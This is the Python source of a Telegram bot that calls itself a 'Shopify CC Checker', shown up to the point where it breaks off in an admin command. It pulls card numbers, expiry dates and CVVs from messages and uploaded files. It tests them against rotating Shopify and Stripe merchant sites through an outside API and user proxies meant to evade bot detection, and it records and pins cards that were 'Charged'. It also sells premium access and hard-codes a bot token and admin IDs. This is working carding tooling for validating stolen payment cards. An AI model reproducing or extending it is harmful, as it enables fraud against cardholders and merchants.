from telethon import TelegramClient, events, Button
from telethon.tl.functions.users import GetFullUserRequest
import pymongo
import certifi

from telethon.tl.types import KeyboardButtonCallback

import requests, random, datetime, json, os, re, asyncio, time

import string

import hashlib

import aiohttp

import aiofiles

from urllib.parse import urlparse

# from emoji import apply_emoji_patch

# Config

MONGO_URI = "+::.uvubs6k.mongodb.net/?appName=Cluster0"
mongo_client = pymongo.MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = mongo_client.ccbot

API_ID = 32423382

API_HASH = ""

BOT_TOKEN = "8863478750:AAHo1_jx-BmdzdU1dhygO_zmJeTB5Gay-SY"

ADMIN_ID = [8754004223] 

GROUP_ID = -1003864910554

PREMIUM_FILE = "premium.json"

FREE_FILE = "free_users.json"

SITE_FILE = "user_sites.json"

KEYS_FILE = "keys.json"

CC_FILE = "cc.txt"

BANNED_FILE = "banned_users.json"

PROXY_FILE = "proxy.json"

ACTIVE_MTXT_PROCESSES = {}

TEMP_WORKING_SITES = {}  # Store working sites temporarily for /check command

# --- Utility Functions ---

async def create_json_file(filename):

    try:

        if not os.path.exists(filename):

            async with aiofiles.open(filename, "w") as file:

                await file.write(json.dumps({}))

    except Exception as e:

        print(f"Error creating {filename}: {str(e)}")

async def initialize_files():
    await load_admins()

    for file in [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE, PROXY_FILE]:

        await create_json_file(file)

async def load_json(filename):

    try:

        if not os.path.exists(filename):

            await create_json_file(filename)

        async with aiofiles.open(filename, "r") as f:

            content = await f.read()

            return json.loads(content)

    except Exception as e:

        print(f"Error loading {filename}: {str(e)}")

        return {}

async def save_json(filename, data):

    try:

        async with aiofiles.open(filename, "w") as f:

            await f.write(json.dumps(data, indent=4))

    except Exception as e:

        print(f"Error saving {filename}: {str(e)}")

def generate_key():

    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def is_premium_user(user_id):

    premium_users = await load_json(PREMIUM_FILE)

    user_data = premium_users.get(str(user_id))

    if not user_data: return False

    expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])

    current_date = datetime.datetime.now()

    if current_date > expiry_date:

        del premium_users[str(user_id)]

        await save_json(PREMIUM_FILE, premium_users)

        return False

    return True

async def add_premium_user(user_id, days):

    premium_users = await load_json(PREMIUM_FILE)

    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)

    premium_users[str(user_id)] = {

        'expiry': expiry_date.isoformat(),

        'added_by': 'admin',

        'days': days

    }

    await save_json(PREMIUM_FILE, premium_users)

async def remove_premium_user(user_id):

    premium_users = await load_json(PREMIUM_FILE)

    if str(user_id) in premium_users:

        del premium_users[str(user_id)]

        await save_json(PREMIUM_FILE, premium_users)

        return True

    return False

async def is_banned_user(user_id):

    banned_users = await load_json(BANNED_FILE)

    return str(user_id) in banned_users

async def ban_user(user_id, banned_by):

    banned_users = await load_json(BANNED_FILE)

    banned_users[str(user_id)] = {

        'banned_at': datetime.datetime.now().isoformat(),

        'banned_by': banned_by

    }

    await save_json(BANNED_FILE, banned_users)

async def unban_user(user_id):

    banned_users = await load_json(BANNED_FILE)

    if str(user_id) in banned_users:

        del banned_users[str(user_id)]

        await save_json(BANNED_FILE, banned_users)

        return True

    return False

async def get_bin_info(card_number):

    try:

        bin_number = card_number[:6]

        timeout = aiohttp.ClientTimeout(total=10)

        async with aiohttp.ClientSession(timeout=timeout) as session:

            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:

                if res.status != 200: return "BIN Info Not Found", "-", "-", "-", "-", "🏳️"

                response_text = await res.text()

                try:

                    data = json.loads(response_text)

                    brand = data.get('brand', '-')

                    bin_type = data.get('type', '-')

                    level = data.get('level', '-')

                    bank = data.get('bank', '-')

                    country = data.get('country_name', '-')

                    flag = data.get('country_flag', '🏳️')

                    return brand, bin_type, level, bank, country, flag

                except json.JSONDecodeError: return "-", "-", "-", "-", "-", "🏳️"

    except Exception: return "-", "-", "-", "-", "-", "🏳️"

def normalize_card(text):

    if not text: return None

    text = text.replace('\n', ' ').replace('/', ' ')

    numbers = re.findall(r'\d+', text)

    cc = mm = yy = cvv = ''

    for part in numbers:

        if len(part) == 16: cc = part

        elif len(part) == 4 and part.startswith('20'): yy = part[2:]

        elif len(part) == 2 and int(part) <= 12 and mm == '': mm = part

        elif len(part) == 2 and not part.startswith('20') and yy == '': yy = part

        elif len(part) in [3, 4] and cvv == '': cvv = part

    if cc and mm and yy and cvv: return f"{cc}|{mm}|{yy}|{cvv}"

    return None

def extract_json_from_response(response_text):

    if not response_text: return None

    start_index = response_text.find('{')

    if start_index == -1: return None

    brace_count = 0

    end_index = -1

    for i in range(start_index, len(response_text)):

        if response_text[i] == '{': brace_count += 1

        elif response_text[i] == '}':

            brace_count -= 1

            if brace_count == 0:

                end_index = i

                break

    if end_index == -1: return None

    json_text = response_text[start_index:end_index + 1]

    try: return json.loads(json_text)

    except json.JSONDecodeError: return None

async def get_user_proxy(user_id):

    """Get a random proxy for a specific user"""

    proxies = await load_json(PROXY_FILE)

    user_proxies = proxies.get(str(user_id), [])

    

    if not user_proxies:

        return None

    

    # Return a random proxy - user_proxies is a list, so we need to check if it's not empty

    if len(user_proxies) == 0:

        return None

    

    return random.choice(user_proxies)

async def remove_dead_proxy(user_id, proxy_url):

    """Remove a dead proxy from user's list"""

    proxies = await load_json(PROXY_FILE)

    user_proxies = proxies.get(str(user_id), [])

    

    # Find and remove the dead proxy

    for proxy_data in user_proxies:

        if proxy_data['proxy_url'] == proxy_url:

            user_proxies.remove(proxy_data)

            

            if user_proxies:

                proxies[str(user_id)] = user_proxies

            else:

                del proxies[str(user_id)]

            

            await save_json(PROXY_FILE, proxies)

            break

async def get_all_user_proxies(user_id):

    """Get all proxies for a specific user"""

    proxies = await load_json(PROXY_FILE)

    return proxies.get(str(user_id), [])

async def check_card_random_site(card, sites, user_id=None, session=None):

    if not sites: return {"Response": "ERROR", "Price": "-", "Gateway": "-"}, -1

    selected_site = random.choice(sites)

    site_index = sites.index(selected_site) + 1

    

    # Get user proxy if available

    proxy_data = await get_user_proxy(user_id) if user_id else None

    

    try:

        # Ensure site has proper format

        if not selected_site.startswith('http'):

            selected_site = f'https://{selected_site}'

        

        # Build proxy string in format: ip:port:username:password

        proxy_str = None

        if proxy_data:

            ip = proxy_data.get('ip')

            port = proxy_data.get('port')

            username = proxy_data.get('username')

            password = proxy_data.get('password')

            

            if username and password:

                proxy_str = f"{ip}:{port}:{username}:{password}"

            else:

                proxy_str = f"{ip}:{port}"

        

        # Build API URL with new endpoint

        url = f'http://62.72.20.10:8081/?{card}&url={selected_site}'

        if proxy_str:

            url += f'&proxy={proxy_str}'

        

        async def parse_res(r):
            if r.status != 200:
                return {"Response": f"HTTP_ERROR_{r.status}", "Price": "-", "Gateway": "-"}, site_index
            try:
                response_json = await r.json()
            except:
                response_text = await r.text()
                return {"Response": f"Invalid JSON response: {response_text[:100]}", "Price": "-", "Gateway": "-"}, site_index
            api_response = response_json.get('Response', '')
            price = response_json.get('Price', '-')
            if price != '-':
                price = f"${price}"
            gateway = response_json.get('Gate', 'Shopify')
            if proxy_data and user_id and ('proxy' in api_response.lower() or 'connection' in api_response.lower() or 'timeout' in api_response.lower()):
                await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                return {
                    "Response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy",
                    "Price": "-",
                    "Gateway": "-",
                    "Status": "Proxy Dead"
                }, site_index
            if "Order completed" in api_response or "💎" in api_response:
                return {
                    "Response": api_response,
                    "Price": price,
                    "Gateway": gateway,
                    "Status": "Charged"
                }, site_index
            else:
                return {
                    "Response": api_response,
                    "Price": price,
                    "Gateway": gateway,
                    "Status": api_response
                }, site_index

        if session:
            async with session.get(url) as res:
                return await parse_res(res)
        else:
            timeout = aiohttp.ClientTimeout(total=100)
            async with aiohttp.ClientSession(timeout=timeout) as session_obj:
                async with session_obj.get(url) as res:
                    return await parse_res(res)

                    

    except Exception as e: 

        return {"Response": str(e), "Price": "-", "Gateway": "-"}, site_index

async def check_card_specific_site(card, site, user_id=None, session=None):

    # Get user proxy if available

    proxy_data = await get_user_proxy(user_id) if user_id else None

    

    try:

        # Ensure site has proper format

        if not site.startswith('http'):

            site = f'https://{site}'

        

        # Build proxy string in format: ip:port:username:password

        proxy_str = None

        if proxy_data:

            ip = proxy_data.get('ip')

            port = proxy_data.get('port')

            username = proxy_data.get('username')

            password = proxy_data.get('password')

            

            if username and password:

                proxy_str = f"{ip}:{port}:{username}:{password}"

            else:

                proxy_str = f"{ip}:{port}"

        

        # Build API URL with new endpoint

        url = f'http://62.72.20.10:8081/?{card}&url={site}'

        if proxy_str:

            url += f'&proxy={proxy_str}'

        

        async def parse_res(r):
            if r.status != 200:
                return {"Response": f"HTTP_ERROR_{r.status}", "Price": "-", "Gateway": "-"}
            try:
                response_json = await r.json()
            except:
                response_text = await r.text()
                return {"Response": f"Invalid JSON response: {response_text[:100]}", "Price": "-", "Gateway": "-"}
            api_response = response_json.get('Response', '')
            price = response_json.get('Price', '-')
            if price != '-':
                price = f"${price}"
            gateway = response_json.get('Gate', 'Shopify')
            if proxy_data and user_id and ('proxy' in api_response.lower() or 'connection' in api_response.lower() or 'timeout' in api_response.lower()):
                await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                return {
                    "Response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy",
                    "Price": "-",
                    "Gateway": "-",
                    "Status": "Proxy Dead"
                }
            if "Order completed" in api_response or "💎" in api_response:
                return {
                    "Response": api_response,
                    "Price": price,
                    "Gateway": gateway,
                    "Status": "Charged"
                }
            else:
                return {
                    "Response": api_response,
                    "Price": price,
                    "Gateway": gateway,
                    "Status": api_response
                }

        if session:
            async with session.get(url) as res:
                return await parse_res(res)
        else:
            timeout = aiohttp.ClientTimeout(total=100)
            async with aiohttp.ClientSession(timeout=timeout) as session_obj:
                async with session_obj.get(url) as res:
                    return await parse_res(res)

                    

    except Exception as e: 

        return {"Response": str(e), "Price": "-", "Gateway": "-"}

def extract_card(text):

    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)

    if match:

        cc, mm, yy, cvv = match.groups()

        if len(yy) == 4: yy = yy[2:]

        return f"{cc}|{mm}|{yy}|{cvv}"

    return normalize_card(text)

def extract_all_cards(text):

    cards = set()

    for line in text.splitlines():

        card = extract_card(line)

        if card: cards.add(card)

    return list(cards)

async def can_use(user_id, chat):

    if await is_banned_user(user_id):

        return False, "banned"

    is_premium = await is_premium_user(user_id)

    is_private = chat.id == user_id

    if is_private:

        if is_premium:

            return True, "premium_private"

        else:

            return False, "no_access"

    else:  # In a group

        if is_premium:

            return True, "premium_group"

        else:

            return True, "group_free"

def get_cc_limit(access_type, user_id=None):

    # Check if user is admin first

    if user_id and user_id in ADMIN_ID:

        return 2000

    if access_type in ["premium_private", "premium_group"]:

        return 500

    elif access_type == "group_free":

        return 50

    return 0

async def save_approved_card(card, status, response, gateway, price):

    try:

        async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:

            await f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")

    except Exception as e: print(f"Error saving card to {CC_FILE}: {str(e)}")

async def pin_charged_message(event, message):

    try:

        if event.is_group: await message.pin()

    except Exception as e: print(f"Failed to pin message: {e}")

def is_valid_url_or_domain(url):

    domain = url.lower()

    if domain.startswith(('http://', 'https://')):

        try: parsed = urlparse(url)

        except: return False

        domain = parsed.netloc

    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'

    return bool(re.match(domain_pattern, domain))

def extract_urls_from_text(text):

    clean_urls = set()

    lines = text.split('\n')

    for line in lines:

        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]

        if cleaned_line and is_valid_url_or_domain(cleaned_line): clean_urls.add(cleaned_line)

    return list(clean_urls)

async def get_user_sites(user_id):

    sites_data = await load_json(SITE_FILE)

    if str(user_id) not in sites_data or not sites_data[str(user_id)]:

        try:

            async with aiofiles.open("/root/Antigravity/files/sites.txt", "r", errors='ignore') as f:

                content = await f.read()

            user_sites = extract_urls_from_text(content)

        except Exception:

            user_sites = []

    else:

        user_sites = sites_data[str(user_id)]

    return user_sites

def parse_proxy_format(proxy):

    """Parse proxy in multiple formats with protocol support"""

    import re

    

    proxy = proxy.strip()

    proxy_type = 'http'  # default

    

    # Check if protocol is specified (socks5://, socks4://, http://, https://)

    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)

    if protocol_match:

        proxy_type = protocol_match.group(1).lower()

        proxy = protocol_match.group(2)

    

    host = ''

    port = ''

    username = ''

    password = ''

    

    # Format: username:password@host:port

    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)

    if match:

        username, password, host, port = match.groups()

    # Format: host:port@username:password

    elif re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy):

        match = re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy)

        host, port, username, password = match.groups()

    # Format: host:port:username:password (check if 2nd part is valid port)

    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):

        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)

        potential_host, potential_port, potential_user, potential_pass = match.groups()

        # Validate port number

        if 0 < int(potential_port) <= 65535:

            host, port, username, password = potential_host, potential_port, potential_user, potential_pass

    # Format: host:port (no authentication)

    elif re.match(r'^([^:@]+):(\d+)$', proxy):

        match = re.match(r'^([^:@]+):(\d+)$', proxy)

        host, port = match.groups()

    else:

        return None

    

    # Validate that we have at least host and port

    if not host or not port:

        return None

    

    # Validate port is numeric and in valid range

    try:

        port_num = int(port)

        if port_num <= 0 or port_num > 65535:

            return None

    except ValueError:

        return None

    

    # Build proxy URL based on type and authentication

    if username and password:

        if proxy_type in ['socks5', 'socks4']:

            proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}'

        else:

            proxy_url = f'http://{username}:{password}@{host}:{port}'

    else:

        if proxy_type in ['socks5', 'socks4']:

            proxy_url = f'{proxy_type}://{host}:{port}'

        else:

            proxy_url = f'http://{host}:{port}'

    

    return {

        'ip': host,

        'port': port,

        'username': username if username else None,

        'password': password if password else None,

        'proxy_url': proxy_url,

        'type': proxy_type

    }

async def test_proxy(proxy_url):

    """Test if proxy is working"""

    try:

        timeout = aiohttp.ClientTimeout(total=15)

        async with aiohttp.ClientSession(timeout=timeout) as session:

            async with session.get('http://api.ipify.org?format=json', proxy=proxy_url) as res:

                if res.status == 200:

                    data = await res.json()

                    return True, data.get('ip', 'Unknown')

                return False, None

    except Exception as e:

        return False, str(e)

async def test_proxy_helper(proxy_data):

    try:

        is_working, result = await test_proxy(proxy_data['proxy_url'])

        return is_working, proxy_data, result

    except:

        return False, proxy_data, None

def is_site_dead(response_text):

    if not response_text: return True

    response_lower = response_text.lower()

    dead_indicators = [

        'receipt id is empty', 'handle is empty', 'product id is empty',

    'tax amount is empty', 'payment method identifier is empty',

    'invalid url', 'error in 1st req', 'error in 1 req',

    'cloudflare', 'connection failed', 'timed out',

    'access denied', 'tlsv1 alert', 'ssl routines',

    'could not resolve', 'domain name not found',

    'name or service not known', 'openssl ssl_connect',

    'empty reply from server', 'HTTPERROR504', 'http error',

    'httperror504', 'timeout', 'unreachable', 'ssl error',

    '502', '503', '504', 'bad gateway', 'service unavailable',

        'gateway timeout', 'network error', 'connection reset', 

    'failed to detect product', 'failed to create checkout',

    'failed to tokenize card', 'failed to get proposal data',

    'submit rejected', 'handle error', 'http 404',

    'delivery_delivery_line_detail_changed', 'delivery_address2_required',

        'url rejected', 'malformed input', 'amount_too_small', 'amount too small','SITE DEAD', 'site dead',

        'CAPTCHA_REQUIRED', 'captcha_required', 'captcha required', 'Site errors', 'Site errors: Failed to tokenize card', 'Failed'

    ]

    return any(indicator in response_lower for indicator in dead_indicators)

async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None):

    try:

        # Ensure site has proper format

        if not site.startswith('http'):

            site = f'https://{site}'

        

        # Get user proxy if available

        proxy_data = await get_user_proxy(user_id) if user_id else None

        

        # Build proxy string in format: ip:port:username:password

        proxy_str = None

        if proxy_data:

            ip = proxy_data.get('ip')

            port = proxy_data.get('port')

            username = proxy_data.get('username')

            password = proxy_data.get('password')

            

            if username and password:

                proxy_str = f"{ip}:{port}:{username}:{password}"

            else:

                proxy_str = f"{ip}:{port}"

        

        # Use the new endpoint

        url = f'http://62.72.20.10:8081/?{test_card}&url={site}'

        if proxy_str:

            url += f'&proxy={proxy_str}'

        

        timeout = aiohttp.ClientTimeout(total=90)

        async with aiohttp.ClientSession(timeout=timeout) as session:

            async with session.get(url) as res:

                if res.status != 200: 

                    return {"status": "dead", "response": f"HTTP {res.status}", "site": site, "price": "-"}

                

                try:

                    response_json = await res.json()

                except:

                    response_text = await res.text()

                    return {"status": "dead", "response": f"Invalid JSON: {response_text[:100]}", "site": site, "price": "-"}

                

                # Parse the new API response format

                response_msg = response_json.get("Response", "")

                price = response_json.get("Price", "-")

                if price != '-':

                    price = f"${price}"

                

                # Check for proxy errors and remove dead proxy

                if proxy_data and user_id and ('proxy' in response_msg.lower() or 'connection' in response_msg.lower() or 'timeout' in response_msg.lower()):

                    await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))

                    return {"status": "proxy_dead", "response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy", "site": site, "price": "-"}

                

                if is_site_dead(response_msg): 

                    return {"status": "dead", "response": response_msg, "site": site, "price": price}

                else: 

                    return {"status": "working", "response": response_msg, "site": site, "price": price}

    except Exception as e: 

        return {"status": "dead", "response": str(e), "site": site, "price": "-"}

import re
from telethon.extensions import html

PREMIUM_EMOJIS = {
    '⚡': '<tg-emoji emoji-id="6321225560789877992">⚡</tg-emoji>',
    '🏦': '<tg-emoji emoji-id="5039789890133296083">🏦</tg-emoji>',
    '📍': '<tg-emoji emoji-id="5775903905498010383">📍</tg-emoji>',
    '📈': '<tg-emoji emoji-id="5298970748172385213">📈</tg-emoji>',
    '💎': '<tg-emoji emoji-id="4902715076873553054">💎</tg-emoji>',
    '🔥': '<tg-emoji emoji-id="5084974483685507801">🔥</tg-emoji>',
    '❌': '<tg-emoji emoji-id="5361696340348779794">❌</tg-emoji>',
    '✅': '<tg-emoji emoji-id="5980995951160987855">✅</tg-emoji>',
    '⛔': '<tg-emoji emoji-id="5172739056592749710">⛔</tg-emoji>',
    '☠️': '<tg-emoji emoji-id="5855207143724027916">☠️</tg-emoji>',
    '☠': '<tg-emoji emoji-id="5855207143724027916">☠</tg-emoji>',
    '🍳': '<tg-emoji emoji-id="5042112436648281096">🍳</tg-emoji>',
    '💸': '<tg-emoji emoji-id="5195033767969839232">💸</tg-emoji>',
    '⚠️': '<tg-emoji emoji-id="5854784287013867183">⚠️</tg-emoji>',
    '⚠': '<tg-emoji emoji-id="5854784287013867183">⚠</tg-emoji>',
    '🚀': '<tg-emoji emoji-id="6025929752982852543">🚀</tg-emoji>',
    '📂': '<tg-emoji emoji-id="5472250091332993630">📂</tg-emoji>',
    '🔒': '<tg-emoji emoji-id="5278622189556354905">🔒</tg-emoji>',
    '🔑': '<tg-emoji emoji-id="5134452506935427991">🔑</tg-emoji>',
    '👤': '<tg-emoji emoji-id="5042101437237036298">👤</tg-emoji>',
    '🌐': '<tg-emoji emoji-id="5253652327734192243">🌐</tg-emoji>',
    '🛡️': '<tg-emoji emoji-id="5852670420074893746">🛡️</tg-emoji>',
    '🛡': '<tg-emoji emoji-id="5852670420074893746">🛡</tg-emoji>',
    '⏳': '<tg-emoji emoji-id="5332455502917949981">⏳</tg-emoji>',
    'ℹ️': '<tg-emoji emoji-id="5285452600601237916">ℹ️</tg-emoji>',
    'ℹ': '<tg-emoji emoji-id="5285452600601237916">ℹ</tg-emoji>',
    '🆓': '<tg-emoji emoji-id="5958417144877160497">🆓</tg-emoji>',
    '💰': '<tg-emoji emoji-id="5039789890133296083">💰</tg-emoji>',
    '📅': '<tg-emoji emoji-id="5775903905498010383">📅</tg-emoji>',
    '📊': '<tg-emoji emoji-id="5298970748172385213">📊</tg-emoji>',
    '👑': '<tg-emoji emoji-id="5350396951407895212">👑</tg-emoji>',
    '👥': '<tg-emoji emoji-id="5784914081165087232">👥</tg-emoji>',
    '⭐': '<tg-emoji emoji-id="5321304384838057247">⭐</tg-emoji>',
    '➕': '<tg-emoji emoji-id="5042112436648281096">➕</tg-emoji>',
    '🚫': '<tg-emoji emoji-id="5172739056592749710">🚫</tg-emoji>',
    '🔄': '<tg-emoji emoji-id="5958417144877160497">🔄</tg-emoji>',
    '💡': '<tg-emoji emoji-id="5350396951407895212">💡</tg-emoji>',
    '🔄': '<tg-emoji emoji-id="5958417144877160497">🔄</tg-emoji>',
    '🔙': '<tg-emoji emoji-id="5172739056592749710">🔙</tg-emoji>',
    '🔓': '<tg-emoji emoji-id="5958417144877160497">🔓</tg-emoji>',
    '🔐': '<tg-emoji emoji-id="5278622189556354905">🔐</tg-emoji>',
}

def to_bold_sans(text):
    return text

def escape_html_except_valid_tags(text):
    if not text:
        return text
    placeholders = []
    def replacer(match):
        placeholders.append(match.group(0))
        return f"__VALID_TAG_PLACEHOLDER_{len(placeholders)-1}__"

    tag_pattern = r'</?(?:b|i|code|tg-emoji)(?:\s+emoji-id="[0-9]+")?>'
    text_with_placeholders = re.sub(tag_pattern, replacer, text)
    escaped_text = text_with_placeholders.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    for i, tag in enumerate(placeholders):
        escaped_text = escaped_text.replace(f"__VALID_TAG_PLACEHOLDER_{i}__", tag)
    return escaped_text

class CustomHTMLParser:
    @staticmethod
    def parse(text):
        if not text:
            return '', []
        for emoji_char, premium_tag in PREMIUM_EMOJIS.items():
            text = text.replace(emoji_char, premium_tag)
        html_text = re.sub(r'\*\*(.*?)\*\*', r'<b>\1</b>', text)
        html_text = re.sub(r'`(.*?)`', r'<code>\1</code>', html_text)
        html_text = re.sub(r'__(.*?)__', r'<i>\1</i>', html_text)
        bold_html = to_bold_sans(html_text)
        escaped_html = escape_html_except_valid_tags(bold_html)
        return html.parse(escaped_html)

    @staticmethod
    def unparse(text, entities):
        return html.unparse(text, entities)

async def load_admins():
    global ADMIN_ID
    try:
        col = db.admins
        doc = await asyncio.get_event_loop().run_in_executor(None, lambda: col.find_one({"_id": "admins_list"}))
        if doc:
            ADMIN_ID = doc.get("ids", [6390225218])
        else:
            ADMIN_ID = [6390225218]
            await asyncio.get_event_loop().run_in_executor(None, lambda: col.update_one({"_id": "admins_list"}, {"$set": {"ids": ADMIN_ID}}, upsert=True))
    except Exception as e:
        print(f"Error loading admins: {e}")
        ADMIN_ID = [6390225218]

async def get_admins():
    global ADMIN_ID
    await load_admins()
    return ADMIN_ID

async def add_admin(user_id):
    global ADMIN_ID
    await load_admins()
    if user_id not in ADMIN_ID:
        ADMIN_ID.append(user_id)
        try:
            col = db.admins
            await asyncio.get_event_loop().run_in_executor(None, lambda: col.update_one({"_id": "admins_list"}, {"$set": {"ids": ADMIN_ID}}, upsert=True))
            return True
        except Exception as e:
            print(f"Error saving admins: {e}")
    return False

client = TelegramClient('cc_bot', API_ID, API_HASH)
client.parse_mode = CustomHTMLParser
# apply_emoji_patch()

def banned_user_message():

    return "🚫 **You Are Banned!**\n\nYou are not allowed to use this bot.\n\nFor appeal, contact @Rytce"

def access_denied_message_with_button():

    message = "🚫 **Access Denied!** This command requires premium access or group usage. Please join our group to use the bot for free."

    buttons = [[Button.url("Join Group for Free Access", "https://t.me/+ZZTpQdOeiEQwYTVl", style="primary", icon=6025929752982852543)]]

    return message, buttons

# --- Bot Command Handlers ---

async def show_start_menu(event, edit=False):
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        if edit:
            await event.edit(banned_user_message())
        else:
            await event.reply(banned_user_message())
        return
        
    text = """🚀 Welcome to Shopify C🇨 Checker
⚡ High-speed Shopify gateway checker
🛡️ Supports all proxy formats
🔄 Multi-site rotation with retry logic
💡 Use the menu below to get started:"""
    
    if access_type in ["premium_private", "premium_group"]:
        text += f"\n💎 **Status:** Premium Access (`{get_cc_limit(access_type, event.sender_id)}` CCs)"
    else:
        text += f"\n🆓 **Status:** Group User (`{get_cc_limit(access_type, event.sender_id)}` CCs)"

    buttons = [
        [
            Button.inline("CMDS", b"show_cmds", style="primary", icon=5226656353744862682),
            Button.inline("Set Proxies", b"show_setproxies", style="primary", icon=5278622189556354905)
        ],
        [
            Button.inline("My Profile", b"show_profile", style="success", icon=5042101437237036298)
        ]
    ]
    
    if edit:
        await event.edit(text, buttons=buttons)
    else:
        await event.reply(text, buttons=buttons)

async def show_cmds_page(event, edit=False):
    text = """⚡ **Command List**

**Shopify Self**
🚀 `/sh` ⇾ Check a single CC.
⚡ `/msh` ⇾ Check multiple CCs from text.
📂 `/mtxt` ⇾ Check CCs from a `.txt` file.
🔄 `/ran` ⇾ Check CCs from `.txt` using random sites.

**Stripe Auth**
🚀 `/st` ⇾ Check a single CC.
⚡ `/mst` ⇾ Check multiple CCs from text.
📂 `/mstxt` ⇾ Check CCs from a `.txt` file.
➕ `/sadd` <site> ⇾ Add Stripe Auth site for ST commands.

**Bot & User Management**
➕ `/add` <site> ⇾ Add site(s) to your DB.
❌ `/rm` <site> ⇾ Remove site(s) from your DB.
🔄 `/seturl` ⇾ Bulk add sites from a `.txt` file.
🔍 `/check` ⇾ Test your saved sites.
👤 `/info` ⇾ Get your user information.
🔑 `/redeem` <key> ⇾ Redeem a premium key.

**Proxy Management**
➕ `/addproxy` <proxy> ⇾ Add proxy
🌐 `/proxy` ⇾ View all your saved proxies.
❌ `/rmpxy` <index|all> ⇾ Remove proxy
"""
    buttons = [[Button.inline("Back to Menu", b"back_to_menu", style="danger", icon=5172739056592749710)]]
    if edit:
        await event.edit(text, buttons=buttons)
    else:
        await event.reply(text, buttons=buttons)

async def show_setproxies_page(event, edit=False):
    text = """📡 **Proxy Setup Guide**

You can configure proxies to bypass bot detection.

**Format:**
🔐 With Auth ⇾ `ip:port:username:password`
🔓 Without Auth ⇾ `ip:port`

**Commands:**
➕ `/addproxy` <proxy> ⇾ Add a proxy (max 100)
📂 `/addproxy` <reply to txt> ⇾ Bulk import proxies from file
🌐 `/proxy` ⇾ View all saved proxies
❌ `/rmpxy` <index|all> ⇾ Remove proxy
"""
    buttons = [[Button.inline("Back to Menu", b"back_to_menu", style="danger", icon=5172739056592749710)]]
    if edit:
        await event.edit(text, buttons=buttons)
    else:
        await event.reply(text, buttons=buttons)

async def show_profile_page(event, edit=False):
    user_id = event.sender_id
    try:
        user = await event.get_sender()
        first_name = user.first_name or "N/A"
        last_name = user.last_name or ""
        full_name = f"{first_name} {last_name}".strip()
        username = f"@{user.username}" if user.username else "N/A"
    except:
        full_name = "N/A"
        username = "N/A"
        
    has_premium = await is_premium_user(user_id)
    premium_status = "✅ Premium Access" if has_premium else "❌ No Premium Access"
    
    user_sites = await get_user_sites(user_id)
    
    if user_sites:
        if len(user_sites) > 10:
            sites_text = "\n".join([f"{idx + 1}. {site}" for idx, site in enumerate(user_sites[:10])]) + f"\n... and {len(user_sites) - 10} more sites"
        else:
            sites_text = "\n".join([f"{idx + 1}. {site}" for idx, site in enumerate(user_sites)])
    else:
        sites_text = "No sites added" 
        
    text = f"""👤 **User Information**

• **Name:** {full_name}
• **Username:** {username}
• **User ID:** `{user_id}`
• **Access:** {premium_status}

**Your Saved Sites** ({len(user_sites)}):
```
{sites_text}
```
"""
    buttons = [[Button.inline("Back to Menu", b"back_to_menu", style="danger", icon=5172739056592749710)]]
    if edit:
        await event.edit(text, buttons=buttons)
    else:
        await event.reply(text, buttons=buttons)

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    try:
        command_name = event.pattern_match.group(1).lower()
    except:
        command_name = 'start'
    if command_name in ['cmds', 'cmd', 'commands']:
        await show_cmds_page(event)
    else:
        await show_start_menu(event)

@client.on(events.CallbackQuery(data=b"show_cmds"))
async def show_cmds_callback(event):
    await show_cmds_page(event, edit=True)

@client.on(events.CallbackQuery(data=b"show_setproxies"))
async def show_setproxies_callback(event):
    await show_setproxies_page(event, edit=True)

@client.on(events.CallbackQuery(data=b"show_profile"))
async def show_profile_callback(event):
    await show_profile_page(event, edit=True)

@client.on(events.CallbackQuery(data=b"back_to_menu"))
async def back_to_menu_callback(event):
    await show_start_menu(event, edit=True)

@client.on(events.NewMessage(pattern='/auth'))

async def auth_user(event):

    if event.sender_id not in ADMIN_ID: return await event.reply("🚫 Only Admin Can Use This Command!")

    try:

        parts = event.raw_text.split()

        if len(parts) != 3: return await event.reply("Format: /auth {user_id} {days}")

        user_id = int(parts[1])

        days = int(parts[2])

        await add_premium_user(user_id, days)

        await event.reply(f"✅ User {user_id} has been granted {days} days of premium access!")

        try: await client.send_message(user_id, f"🎉 Congratulations!\n\nYou have successfully redeemed {days} days of premium access!\n\nYou can now use the bot in private chat with 500 CC limit!")

        except: pass

    except ValueError: await event.reply("❌ Invalid user ID or days!")

    except Exception as e: await event.reply(f"❌ Error: {e}")

@client.on(events.NewMessage(pattern='/key'))

async def generate_keys(event):

    if event.sender_id not in ADMIN_ID: return await event.reply("🚫 Only Admin Can Use This Command!")

    try:

